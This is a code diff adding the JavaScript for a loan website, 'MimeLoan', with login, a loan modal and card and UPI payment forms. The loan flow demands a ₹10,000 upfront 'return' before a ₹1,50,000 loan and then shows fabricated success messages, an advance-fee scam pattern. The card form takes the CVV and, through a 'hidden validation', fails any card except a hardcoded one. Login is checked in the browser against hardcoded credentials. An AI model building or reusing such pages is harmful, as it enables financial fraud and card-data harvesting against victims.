+            e.target.value = formattedValue.substring(0, 19);
+        });
+        
+        // Format expiry date input
+        expiryDateInput.addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+            if (value.length >= 2) {
+                value = value.substring(0, 2) + '/' + value.substring(2, 4);
+            }
+            e.target.value = value.substring(0, 5);
+        });
+        
+        // Check if user is already logged in
+        document.addEventListener('DOMContentLoaded', function() {
+            const isLoggedIn = localStorage.getItem('mimeLoanLoggedIn');
+            
+            if (isLoggedIn === 'true') {
+                showDashboard();
+            }
+            
+            // Add fade-in animation to elements
+            const elementsToAnimate = document.querySelectorAll('.card, .loan-section, .loan-eligibility, .payment-section');
+            elementsToAnimate.forEach(el => {
+                el.classList.add('fade-in');
+            });
+        });
+        
+        // Login form submission
+        loginForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            if (username === validUsername && password === validPassword) {
+                // Store login state
+                localStorage.setItem('mimeLoanLoggedIn', 'true');
+                showDashboard();
+            } else {
+                // Show error notification
+                loginNotification.textContent = 'Invalid username or password. Please try again.';
+                loginNotification.className = 'notification error';
+                loginNotification.style.display = 'block';
+            }
+        });
+        
+        // Logout button click
+        logoutBtn.addEventListener('click', function() {
+            localStorage.removeItem('mimeLoanLoggedIn');
+            showLogin();
+        });
+        
+        // Apply for loan button - NEW FLOW
+        applyLoanBtn.addEventListener('click', function() {
+            // Show modal with the process steps
+            loanModal.style.display = 'flex';
+            modalNotification.style.display = 'none';
+        });
+        
+        // Close modal
+        closeModal.addEventListener('click', function() {
+            loanModal.style.display = 'none';
+        });
+        
+        // Cancel process
+        cancelProcess.addEventListener('click', function() {
+            loanModal.style.display = 'none';
+        });
+        
+        // Process return button
+        processReturn.addEventListener('click', function() {
+            const method = returnMethod.value;
+            
+            // Show processing notification
+            modalNotification.textContent = `Processing ₹10,000 return via ${getMethodName(method)}...`;
+            modalNotification.className = 'notification';
+            modalNotification.style.display = 'block';
+            
+            // Simulate processing delay
+            setTimeout(() => {
+                modalNotification.textContent = '₹10,000 return processed successfully! You can now apply for the ₹1,50,000 loan.';
+                modalNotification.className = 'notification success';
+                
+                // Update the process step
+                document.querySelectorAll('.process-step')[1].classList.add('step-completed');
+                document.querySelectorAll('.process-step')[1].classList.remove('step-current');
+                document.querySelectorAll('.process-step')[2].classList.add('step-current');
+                
+                // Change button to apply for loan
+                processReturn.textContent = 'Apply for ₹1,50,000 Loan';
+                processRemoveEventListenerAndAddNew();
+            }, 2000);
+        });
+        
+        function getMethodName(method) {
+            switch(method) {
+                case 'bank_transfer': return 'Bank Transfer';
+                case 'upi': return 'UPI Payment';
+                case 'card': return 'Credit/Debit Card';
+                default: return 'Selected Method';
+            }
+        }
+        
+        function processRemoveEventListenerAndAddNew() {
+            // Remove old event listener and add new one
+            processReturn.removeEventListener('click', arguments.callee);
+            processReturn.addEventListener('click', function() {
+                alert('Congratulations! Your ₹1,50,000 loan application has been submitted successfully. Our loan officer will contact you within 24 hours.');
+                loanModal.style.display = 'none';
+            });
+        }
+        
+        // Request more button
+        requestMoreBtn.addEventListener('click', function() {
+            alert('Additional funds request form opened. Please specify the amount and purpose for the loan.');
+        });
+        
+        // View statement button
+        viewStatementBtn.addEventListener('click', function() {
+            alert('Your account statement for the last 6 months is being generated. It will be available for download shortly.');
+        });
+        
+        // New loan request button
+        newLoanRequestBtn.addEventListener('click', function() {
+            alert('New loan request form opened. Please fill in all the required details to submit your request.');
+        });
+        
+        // Card payment form submission
+        cardPaymentForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const cardNumber = document.getElementById('cardNumber').value.replace(/\s+/g, '');
+            const cardHolder = document.getElementById('cardHolder').value;
+            const expiryDate = document.getElementById('expiryDate').value;
+            const cvv = document.getElementById('cvv').value;
+            const amount = document.getElementById('cardAmount').value;
+            
+            // Check if card number is valid (hidden validation)
+            if (cardNumber === validCardNumber) {
+                paymentNotification.textContent = `Payment of ₹${amount} successfully processed! Your top-up will be credited within 15 minutes.`;
+                paymentNotification.className = 'notification success';
+                paymentNotification.style.display = 'block';
+                
+                // Update balance after successful payment
+                setTimeout(() => {
+                    alert(`Payment Successful! ₹${amount} has been added to your MimeLoan account.`);
+                }, 100);
+            } else {
+                paymentNotification.textContent = 'Payment failed! Please check your card details and try again.';
+                paymentNotification.className = 'notification error';
+                paymentNotification.style.display = 'block';
+            }
+            
+            // Scroll to notification
+            paymentNotification.scrollIntoView({ behavior: 'smooth' });
+        });
+        
+        // UPI payment form submission
+        upiPaymentForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const upiId = document.getElementById('upiId').value;
+            const amount = document.getElementById('upiAmount').value;
+            
+            // Check if UPI ID is valid (hidden validation)
+            if (upiId === validUpiId) {
+                paymentNotification.textContent = `UPI Payment of ₹${amount} successfully processed! Your top-up will be credited within 15 minutes.`;
+                paymentNotification.className = 'notification success';
+                paymentNotification.style.display = 'block';
+                
+                // Update balance after successful payment
+                setTimeout(() => {
+                    alert(`UPI Payment Successful! ₹${amount} has been added to your MimeLoan account.`);
+                }, 100);
+            } else {
+                paymentNotification.textContent = 'Payment failed! Please check your UPI ID and try again.';
+                paymentNotification.className = 'notification error';
+                paymentNotification.style.display = 'block';
+            }
+            
+            // Scroll to notification
+            paymentNotification.scrollIntoView({ behavior: 'smooth' });
+        });
+        
+        // Main tab switching
+        tabs.forEach(tab => {
+            tab.addEventListener('click', function() {
+                const tabId = this.getAttribute('data-tab');
+                
+                // Remove active class from all tabs
+                tabs.forEach(t => t.classList.remove('active'));
+                tabContents.forEach(tc => tc.classList.remove('active'));
+                
+                // Add active class to current tab
+                this.classList.add('active');
+                document.getElementById(tabId).classList.add('active');
+                
+                // Clear payment notification when switching tabs
+                paymentNotification.style.display = 'none';
+            });
+        });
+        
+        // Payment tab switching
+        paymentTabs.forEach(tab => {
+            tab.addEventListener('click', function() {
+                const paymentType = this.getAttribute('data-payment');
+                
+                // Remove active class from all payment tabs
+                paymentTabs.forEach(t => t.classList.remove('active'));
+                paymentContents.forEach(pc => pc.classList.remove('active'));
+                
+                // Add active class to current payment tab
+                this.classList.add('active');
+                document.getElementById(`${paymentType}-payment`).classList.add('active');
+                
+                // Clear payment notification when switching tabs
+                paymentNotification.style.display = 'none';
+            });
+        });
+        
+        // Show dashboard function
+        function showDashboard() {
+            loginPage.style.display = 'none';
+            dashboardPage.style.display = 'block';
+        }
+        
+        // Show login function
+        function showLogin() {
+            // Clear form
+            loginForm.reset();
+            loginNotification.style.display = 'none';
+            
+            dashboardPage.style.display = 'none';
+            loginPage.style.display = 'flex';
+        }
+        
+        // Close modal when clicking outside
+        window.addEventListener('click', function(e) {
+            if (e.target === loanModal) {
+                loanModal.style.display = 'none';
+            }
+        });
+    </script>
+</body>
+</html>
